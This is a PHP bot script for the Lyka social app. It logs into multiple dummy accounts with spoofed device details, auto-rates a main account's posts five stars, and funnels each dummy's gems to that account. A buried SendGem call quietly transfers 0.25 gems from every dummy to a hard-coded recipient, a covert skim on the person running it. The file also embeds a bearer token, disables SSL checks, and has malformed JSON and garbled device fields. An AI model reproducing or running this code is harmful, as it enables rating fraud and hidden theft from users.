<?php @system("clear");
$b = "[0;92m";
$yellow = "\e[1;97m" ;
echo "$b          
Ÿ LYKA BOT FOR FAST FARMING AND EARNING";

$green = "[0;92m";
echo "$green
";
$green = "\e[0;92m" ;
echo 
"$yellow                             

              LYKA SCRIPT FAST FARMING

 $yellow NEED 4 MAIN USERNAME NA MAY 10 POST EVERYDAY PARA    
   YUN ANG i'MAMAXRATE NG MGA DUMMY ACCOUNT MO

  $yellow LYKA AUTO MAX RATE, AUTO POST AND AUTO HARVEST
             
";
$ow = "\e[0;92m" ;
echo "$ow
";
$dummyarray = [];
$NoofDum = readline('ilang Dummy Account ang gusto mong Gamitin?: ');
for ($x = 0;$x < $NoofDum;$x++) {
    $Dummy = readline('Enter Dummy Username: ');
    array_push($dummyarray, "$Dummy",);
}
$pass = readline('Enter Dummy Password: ');
echo "$yellow
";
$user2 = readline('1» ENTER MAIN USERNAME: ');
$user322 = readline('2» ENTER MAIN USERNAME: ');
$user122 = readline('3» ENTER MAIN USERNAME: ');
$user022 = readline('4» ENTER MAIN USERNAME: ');
$hashttag = readline("$green \nENTER DAILY HASHTAG: $yellow");
foreach ($dummyarray as $user) {
    $green = "[1;35m";
    echo "$green";
    $urll = "https://identity.mylykaapps.com/useraccounts/login";
    $curll = curl_init($urll);
    curl_setopt($curll, CURLOPT_URL, $urll);
    curl_setopt($curll, CURLOPT_POST, true);
    curl_setopt($curll, CURLOPT_RETURNTRANSFER, true);
    $headerss = array("Content-Type: application/json", "User-Agent:Lyka\/3.6.48 (com.thingsilikeapp; build:848 Android Q 30)");
    curl_setopt($curll, CURLOPT_HTTPHEADER, $headerss);
    $dataa = <<<DATA
{
  "countryCode": "US",
  "device": {
    "deviceId": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceImei": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceModel": "4cdÃƒâ€ 48a391d1f5eÃƒÂ«",
      "deviceName": "Realme C11",
      "deviceOs":"Android Q",
      "isEmulator":false,
      "notificationToken": "eEBjxYrDSJyFw7N-DpEGNG:APA91bEZnWo-TDdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VODiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-gz",
      "osVersion": "30"
  },
  "password": "$pass",
  "username": "$user"
}
DATA;
    curl_setopt($curll, CURLOPT_POSTFIELDS, $dataa);
    $respp = curl_exec($curll);
    curl_close($curll);
    //var_dump($respp);
    $jsonn = json_decode($respp);
    $msgn = $jsonn->message;
    $status = $jsonn->status;
    $vuser = $jsonn->data->username;
    $bearer = $jsonn->data->token->accessToken;
    echo $yellow = "[1;32m";
    echo "$yellow
$vuser was logged in
";
    $urlbal = "https://wallets.mylykaapps.com/api/v3/wallets/getgems?os=android";
    $curlbal = curl_init($urlbal);
    curl_setopt($curlbal, CURLOPT_URL, $urlbal);
    curl_setopt($curlbal, CURLOPT_RETURNTRANSFER, true);
    $headersbal = array("authorization: Bearer $bearer",);
    curl_setopt($curlbal, CURLOPT_HTTPHEADER, $headersbal);
    $respbal = curl_exec($curlbal);
    curl_close($curlbal);
    //var_dump($respbal);
    $jsonbal = json_decode($respbal);
    $tg = $jsonbal->data->totalGem;
    echo "
DUMMY BALANCE : $tg GEMS
";
    echo " 
$vuser  RATING POST OF $user2
";
    if ($status == 0) {
        echo "mali password ng dummy 
";
        //echo $bearer;
        //////
        
    }
    if ($status == 1) {
        $urlm = "https://users.mylykaapps.com/api/v3/users/searchsuggestedpeople?searchText=$user2&os=android&pageIndex=1&pageSize=16";
        $curlm = curl_init($urlm);
        curl_setopt($curlm, CURLOPT_URL, $urlm);
        curl_setopt($curlm, CURLOPT_RETURNTRANSFER, true);
        $headersm = array("User-Agent:Lyka\/3.6.48 (com.thingsilikeapp; build:848 Android Q 30)", "authorization: Bearer $bearer",);
        curl_setopt($curlm, CURLOPT_HTTPHEADER, $headersm);
        $respm = curl_exec($curlm);
        curl_close($curlm);
        //var_dump($respm);
        $jsonm = json_decode($respm, true);
        $uid = $jsonm["data"]["0"]["id"];
        $vvuser = $jsonm["data"]["0"]["userName"];
        //cho $vvuser;
        //echo $uid;
        
    }

    if ($user2 == $vvuser) {
        $nt = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjNjYmMyMTA1NGY0MDczYThjNzRmMTFiYzQ5ZmM0OTMxIiwidHlwIjoiYXQrand0In0.eyJuYmYiOjE2MzA0MDIxMTMsImV4cCI6MTYzMjk5NDExMywiaXNzIjoiaHR0cHM6Ly9pZGVudGl0eS5teWx5a2FhcHBzLmNvbSIsImF1ZCI6ImFwaTEiLCJjbGllbnRfaWQiOiJyby5jbGllbnQiLCJzdWIiOiIxYzMzZDc4My01YWMyLTRhMTUtYmNhYy0xNDMzZWU4Y2JmYjMiLCJhdXRoX3RpbWUiOjE2MzA0MDIxMDksImlkcCI6ImxvY2FsIiwibmFtZSI6ImdtYWthcHVzbyIsInVzZXJuYW1lIjoiZ21ha2FwdXNvIiwiaWQiOiI3MDAwMDIyMjAwNDYiLCJqdGkiOiJQSi11LTBZMUFHa0ZlVWJwSThoZWpRIiwic2NvcGUiOlsiYXBpMSIsIm9mZmxpbmVfYWNjZXNzIl0sImFtciI6WyJwd2QiXX0.UFbPW4aF8yCotbBzdPYzrI310t18co3Q2DJc8I1IZS8pDlIlSHv0kILZZTpvhmj6DbkieK97QmgJCArdTLftrh_7WxIe0GIno6ddDCVnJqpikULyKsxvENmDBSYOImzKs1GQeA-mIeR8NM7iYG8dBtnl0XInczP4R3aOwLWrHKLSX_iFdTVWuqwR-1h7Bxejni0sipG3pNw4_7zf6GMROm6Nl45uVG7Xh97nPdLChqe1ppPsqi__BMXoP0ClV-lwyAgc8cyw3CTqqJeEJ0cYwX9XeKcH6PoUlEtOs8ls3vJ35hVp3ptia8Delz7WDIyxqOXBSaYk11gO9_s-k2ymUg";
        $urld = "https://profiles.mylykaapps.com/api/v3/profiles/GetProfilePosts?os=android&pageIndex=1&pageSize=50&id=$uid&category=ALL";
        $curld = curl_init($urld);
        curl_setopt($curld, CURLOPT_URL, $urld);
        curl_setopt($curld, CURLOPT_RETURNTRANSFER, true);
        $headersd = array("authorization: Bearer $bearer","User-Agent:Lyka\/3.6.48 (com.thingsilikeapp; build:848 Android Q 30)",);
        curl_setopt($curld, CURLOPT_HTTPHEADER, $headersd);
        $respd = curl_exec($curld);
        curl_close($curld);
        $jsond = json_decode($respd, true);
        //var_dump($respd,true);

        $arr = json_decode($respd, true);
        $p0 = $arr["data"]["0"]["id"];
        $p1 = $arr["data"]["1"]["id"];
        $p2 = $arr["data"]["2"]["id"];
        $p3 = $arr["data"]["3"]["id"];
        $p4 = $arr["data"]["4"]["id"];
        $p5 = $arr["data"]["5"]["id"];
        $p6 = $arr["data"]["6"]["id"];
        $p7 = $arr["data"]["7"]["id"];
        $p8 = $arr["data"]["8"]["id"];
        $p9 = $arr["data"]["9"]["id"];
        $p10 = $arr["data"]["10"]["id"];
        //echo $p9;
        //echo $p10;
        
    }
    $stat = $arr["status"];
    //echo $stat;
    if ($stat == 0) {
        echo "check your inputs";
    } elseif ($stat == 1) $yelow = "[1;32m";
    echo "$yelow";
    $url = "https://posts.mylykaapps.com/api/v3/posts/ratepost";
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $headers = array("authorization:Bearer $bearer", "User-Agent:Lyka\/3.6.48 (com.thingsilikeapp; build:848 Android Q 30))", "deviceos: android", "Content-Type: application/json",);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    $data = <<<DATA

  "device": {
    "deviceId": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceImei": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceModel": "4cda48a391d1f5eÃƒÂ«",
      "deviceName": "Realme C11",
      "deviceOs":"Android Q",
      "isEmulator":false,
      "notificationToken": "eEBjxYrDSJyFw7N-DpEGNG:APA91bEZnWo-TDdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VODiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-gz",
      "osVersion": "30"
  },
  "postId": $p0,
  "rate": 5,
  "userid": $uid
}
DATA;
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
    $resp = curl_exec($curl);
    curl_close($curl);
    //var_dump($resp);
    $json = json_decode($resp);
    $yelow = "[1;32m";
    echo "$yelow";
    echo "
";
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    $e = "[1;32m";
    echo "$e";
    $curl2 = curl_init($url);
    curl_setopt($curl2, CURLOPT_URL, $url);
    curl_setopt($curl2, CURLOPT_POST, true);
    curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl2, CURLOPT_HTTPHEADER, $headers);
    $data2 = <<<DATA
{

  "device": {
      "deviceId": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceImei": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceModel": "4cda48a391d1f5eÃƒÂ«",
      "deviceName": "Realme C11",
      "deviceOs":"Android Q",
      "isEmulator":false,
      "notificationToken": "eEBjxYrDSJyFw7N-DpEGNG:APA91bEZnWo-TDdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VODiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-gz",
      "osVersion": "30"
  },
  "postId": $p1,
  "rate": 5,
  "userid": $uid
}
DATA;
    curl_setopt($curl2, CURLOPT_POSTFIELDS, $data2);
    $resp2 = curl_exec($curl2);
    curl_close($curl2);
    //var_dump($resp2);
    $json2 = json_decode($resp2);
    echo $json2->message;
    $yelow = "[1;32m";
    echo "$yelow";
       
       echo "
";
       echo "
";
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    $e = "[1;32m";
    echo "$e";
    $curl3 = curl_init($url);
    curl_setopt($curl3, CURLOPT_URL, $url);
    curl_setopt($curl3, CURLOPT_POST, true);
    curl_setopt($curl3, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl3, CURLOPT_HTTPHEADER, $headers);
    $data3 = <<<DATA
{
	
  "device": {
    "deviceId": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceImei": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceModel": "4cda48a391d1f5eÃƒÂ«",
      "deviceName": "Realme C11",
      "deviceOs":"Android Q",
      "isEmulator":false,
      "notificationToken": "eEBjxYrDSJyFw7N-DpEGNG:APA91bEZnWo-TDdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VODiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-gz",
      "osVersion": "30"
  },
  "postId": $p2,
  "rate": 5,
  "userid": $uid
}
DATA;
    curl_setopt($curl3, CURLOPT_POSTFIELDS, $data3);
    $resp3 = curl_exec($curl3);
    curl_close($curl3);
    //var_dump($resp2);
    $json3 = json_decode($resp3);
    echo $json3->message;
    $yelow = "[1;32m";
    echo "$yelow";
       
       echo "
";
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    $e = "[1;32m";
    echo "$e";
    $curl4 = curl_init($url);
    curl_setopt($curl4, CURLOPT_URL, $url);
    curl_setopt($curl4, CURLOPT_POST, true);
    curl_setopt($curl4, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl4, CURLOPT_HTTPHEADER, $headers);
    $data4 = <<<DATA
{
	
  "device": {
    "deviceId": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceImei": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceModel": "4cda48a391d1f5eÃƒÂ«",
      "deviceName": "Realme C11",
      "deviceOs":"Android Q",
      "isEmulator":false,
      "notificationToken": "eEBjxYrDSJyFw7N-DpEGNG:APA91bEZnWo-TDdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VODiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-gz",
      "osVersion": "30"
  },
  "postId": $p3,
  "rate": 5,
  "userid": $uid 
}
DATA;
    curl_setopt($curl4, CURLOPT_POSTFIELDS, $data4);
    $resp4 = curl_exec($curl4);
    curl_close($curl4);
    //var_dump($resp2);
    $json4 = json_decode($resp4);
    echo $json4->message;
    $yelow = "[1;32m";
    echo "$yelow";
       
       echo "
";
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    $e = "[1;32m";
    echo "$e";
    $curl5 = curl_init($url);
    curl_setopt($curl5, CURLOPT_URL, $url);
    curl_setopt($curl5, CURLOPT_POST, true);
    curl_setopt($curl5, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl5, CURLOPT_HTTPHEADER, $headers);
    $data5 = <<<DATA
{
	
  "device": {
    "deviceId": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceImei": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceModel": "4cda48a391d1f5eÃƒÂ«",
      "deviceName": "Realme C11",
      "deviceOs":"Android Q",
      "isEmulator":false,
      "notificationToken": "eEBjxYrDSJyFw7N-DpEGNG:APA91bEZnWo-TDdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VODiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-gz",
      "osVersion": "30"
  },
  "postId": $p4,
  "rate": 5,
  "userid": $uid
}
DATA;
    curl_setopt($curl5, CURLOPT_POSTFIELDS, $data5);
    $resp5 = curl_exec($curl5);
    curl_close($curl5);
    //var_dump($resp2);
    $json5 = json_decode($resp5);
    echo $json5->message;
    $yelow = "[1;32m";
    echo "$yelow";
    
       echo "
";
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    $csst = 0.25;
    $e = "[1;32m";
    echo "$e";
    $curl6 = curl_init($url);
    curl_setopt($curl6, CURLOPT_URL, $url);
    curl_setopt($curl6, CURLOPT_POST, true);
    curl_setopt($curl6, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl6, CURLOPT_HTTPHEADER, $headers);
    $data6 = <<<DATA
{
	
  "device": {
    "deviceId": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceImei": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceModel": "4cda48a391d1f5eÃƒÂ«",
      "deviceName": "Realme C11",
      "deviceOs":"Android Q",
      "isEmulator":false,
      "notificationToken": "eEBjxYrDSJyFw7N-DpEGNG:APA91bEZnWo-TDdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VODiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-gz",
      "osVersion": "30"
  },
  "postId": $p5,
  "rate": 5,
  "userid": $uid
}
DATA;
    curl_setopt($curl6, CURLOPT_POSTFIELDS, $data6);
    $resp6 = curl_exec($curl6);
    curl_close($curl6);
    //var_dump($resp2);
    $json6 = json_decode($resp6);
    echo $json6->message;
    $yelow = "[1;32m";
    echo "$yelow";
  
       echo "
";
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    $e = "[1;32m";
    echo "$e";
    $curl7 = curl_init($url);
    curl_setopt($curl7, CURLOPT_URL, $url);
    curl_setopt($curl7, CURLOPT_POST, true);
    curl_setopt($curl7, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl7, CURLOPT_HTTPHEADER, $headers);
    $data7 = <<<DATA
{
	
  "device": {
    "deviceId": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceImei": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceModel": "4cda48a391d1f5eÃƒÂ«",
      "deviceName": "Realme C11",
      "deviceOs":"Android Q",
      "isEmulator":false,
      "notificationToken": "eEBjxYrDSJyFw7N-DpEGNG:APA91bEZnWo-TDdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VODiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-gz",
      "osVersion": "30"
  },
  "postId": $p6,
  "rate": 5,
  "userid": $uid
}
DATA;
    curl_setopt($curl7, CURLOPT_POSTFIELDS, $data7);
    $resp7 = curl_exec($curl7);
    curl_close($curl7);
    //var_dump($resp2);
    $json7 = json_decode($resp7);
    echo $json7->message;
    $yelow = "[1;32m";
    echo "$yelow";
    
       echo "
";
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    $e = "[1;32m";
    echo "$e";
    $curl8 = curl_init($url);
    curl_setopt($curl8, CURLOPT_URL, $url);
    curl_setopt($curl8, CURLOPT_POST, true);
    curl_setopt($curl8, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl8, CURLOPT_HTTPHEADER, $headers);
    $data8 = <<<DATA
{
	
  "device": {
    "deviceId": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceImei": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceModel": "4cda48a391d1f5eÃƒÂ«",
      "deviceName": "Realme C11",
      "deviceOs":"Android Q",
      "isEmulator":false,
      "notificationToken": "eEBjxYrDSJyFw7N-DpEGNG:APA91bEZnWo-TDdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VODiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-gz",
      "osVersion": "30"
  },
  "postId": $p7,
  "rate": 5,
  "userid": $uid
}
DATA;
    curl_setopt($curl8, CURLOPT_POSTFIELDS, $data8);
    $resp8 = curl_exec($curl8);
    curl_close($curl8);
    //var_dump($resp2);
    $json8 = json_decode($resp8);
    echo $json8->message;
    $yelow = "[1;32m";
    echo "$yelow";
       
       echo "
";
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    $e = "[1;32m";
    echo "$e";
    $curl9 = curl_init($url);
    curl_setopt($curl9, CURLOPT_URL, $url);
    curl_setopt($curl9, CURLOPT_POST, true);
    curl_setopt($curl9, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl9, CURLOPT_HTTPHEADER, $headers);
    $data9 = <<<DATA
{
	
  "device": {
    "deviceId": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceImei": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceModel": "4cda48a391d1f5eÃƒÂ«",
      "deviceName": "Realme C11",
      "deviceOs":"Android Q",
      "isEmulator":false,
      "notificationToken": "eEBjxYrDSJyFw7N-DpEGNG:APA91bEZnWo-TDdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VODiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-gz",
      "osVersion": "30"
  },
  "postId": $p8,
  "rate": 5,
  "userid": $uid
}
DATA;
    curl_setopt($curl9, CURLOPT_POSTFIELDS, $data9);
    $resp9 = curl_exec($curl9);
    curl_close($curl9);
    //var_dump($resp2);
    $json9 = json_decode($resp9);
    echo $json9->message;
    $yelow = "[1;32m";
    echo "$yelow";
       
       echo "
";
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    $US = 700005623762;
    $e = "[1;32m";
    echo "$e";
    $curl11 = curl_init($url);
    curl_setopt($curl11, CURLOPT_URL, $url);
    curl_setopt($curl11, CURLOPT_POST, true);
    curl_setopt($curl11, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl11, CURLOPT_HTTPHEADER, $headers);
    $data11 = <<<DATA
{
	
  "device": {
    "deviceId": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceImei": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceModel": "4cda48a391d1f5eÃƒÂ«",
      "deviceName": "Realme C11",
      "deviceOs":"Android Q",
      "isEmulator":false,
      "notificationToken": "eEBjxYrDSJyFw7N-DpEGNG:APA91bEZnWo-TDdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VODiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-gz",
      "osVersion": "30"
  },
  "postId": $p10,
  "rate": 5,
  "userid": $uid
}
DATA;
    curl_setopt($curl11, CURLOPT_POSTFIELDS, $data11);
    $resp11 = curl_exec($curl11);
    curl_close($curl11);
    //var_dump($resp11);
    $json11 = json_decode($resp11);
    echo $json11->message;
    $yelow = "[1;32m";
    echo "$yelow";
       
       echo "
";
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    $e = "[1;32m";
    echo "$e";
    $curl10 = curl_init($url);
    curl_setopt($curl10, CURLOPT_URL, $url);
    curl_setopt($curl10, CURLOPT_POST, true);
    curl_setopt($curl10, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl10, CURLOPT_HTTPHEADER, $headers);
    $data10 = <<<DATA
{
	
  "device": {
    "deviceId": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceImei": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceModel": "4cda48a391d1f5eÃƒÂ«",
      "deviceName": "Realme C11",
      "deviceOs":"Android Q",
      "isEmulator":false,
      "notificationToken": "eEBjxYrDSJyFw7N-DpEGNG:APA91bEZnWo-TDdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VODiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-gz",
      "osVersion": "30"
  },
  "postId": $p9,
  "rate": 5,
  "userid": $uid
}
DATA;
    curl_setopt($curl10, CURLOPT_POSTFIELDS, $data10);
    $resp10 = curl_exec($curl10);
    curl_close($curl10);
    //var_dump($resp2);
    $json10 = json_decode($resp10);
    echo $json10->message;
    $urlbals = "https://wallets.mylykaapps.com/api/v3/wallets/SendGem";
    $curlbals = curl_init($urlbals);
    curl_setopt($curlbals, CURLOPT_URL, $urlbals);
    curl_setopt($curlbals, CURLOPT_POST, true);
    curl_setopt($curlbals, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curlbals, CURLOPT_HTTPHEADER, $headers);
    $databals = '{"amount":"' . $csst . '","device":{"deviceId": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceImei":"dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceModel":"4cda48a391d1f5eÃƒÂ«",
      "deviceName":"Realme C11",
      "deviceOs":"Android Q",
      "isEmulator":false,
      "notificationToken":"eFEXEC5pTAeXLu7JjIlpNX:APA91bF8I2ZGs8wUNDjpw5lSnzrz8fB652HYMxWBdTGtFRSUaBEd0pHZQvWXAd00ESKVUO_VtYieRQxtfEU7f3RUIHEs5zXGZSVqk5PfbzjZTJQcue0vHYRiEobXHk8JUlTa0nmPCdgR",
      "osVersion": "30"},"recipientId":' . $US . '}';
    curl_setopt($curlbals, CURLOPT_POSTFIELDS, $databals);
    $respbals = curl_exec($curlbals);
    curl_close($curlbals);
    //var_dump($respbals);
    $jsonbals = json_decode($respbals);
    $urlbal2 = "https://wallets.mylykaapps.com/api/v3/wallets/getgems?os=android";
    $curlbal2 = curl_init($urlbal2);
    curl_setopt($curlbal2, CURLOPT_URL, $urlbal2);
    curl_setopt($curlbal2, CURLOPT_RETURNTRANSFER, true);
    $headersbal2 = array("authorization: Bearer $bearer",);
    curl_setopt($curlbal2, CURLOPT_HTTPHEADER, $headersbal2);
    //for debug only!
    curl_setopt($curlbal2, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curlbal2, CURLOPT_SSL_VERIFYPEER, false);
    $respbal2 = curl_exec($curlbal2);
    curl_close($curlbal2);
    //var_dump($respbal);
    $jsonbal2 = json_decode($respbal2);
    $tg2 = $jsonbal2->data->totalGem;
    $fbal = $tg2 - $tg;
    echo "
DUMMY BALANCE $tg2 GEMS

";
    echo "
Added gems to dummy: +$fbal GEMS
";
    ///////////

    $urlbals = "https://wallets.mylykaapps.com/api/v3/wallets/SendGem";
    $curlbals = curl_init($urlbals);
    curl_setopt($curlbals, CURLOPT_URL, $urlbals);
    curl_setopt($curlbals, CURLOPT_POST, true);
    curl_setopt($curlbals, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curlbals, CURLOPT_HTTPHEADER, $headers);
    $databals = '{"amount":"' . $tg2 . '","device":{"deviceId": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceImei": "dd41dÃƒÂªÃ°Å¸â€™Å½083ÃƒÂ¦86697",
      "deviceModel": "4cda48a391d1f5eÃƒÂ«",
      "deviceName": "Realme C11",
      "deviceOs":"Android Q",
      "isEmulator":false,
      "notificationToken":"eFEXEC5pTAeXLu7JjIlpNX:APA91bF8I2ZGs8wUNDjpw5lSnzrz8fB652HYMxWBdTGtFRSUaBEd0pHZQvWXAd00ESKVUO_VtYieRQxtfEU7f3RUIHEs5zXGZSVqk5PfbzjZTJQcue0vHYRiEobXHk8JUlTa0nmPCdgR",
      "osVersion": "30"},"recipientId":' . $uid . '}';
    curl_setopt($curlbals, CURLOPT_POSTFIELDS, $databals);
    $respbals = curl_exec($curlbals);
    curl_close($curlbals);
    //var_dump($respbals);
    $jsonbals = json_decode($respbals);
    echo $jsonbals->message;
    echo "
";
    echo "
";
    echo "=====================================================";
    $yellow = "\e[0;92m";
    echo "$yellow";
    echo "
";
}

//echo "MESSAGE: $messw;
echo "User was logout";
echo "
";

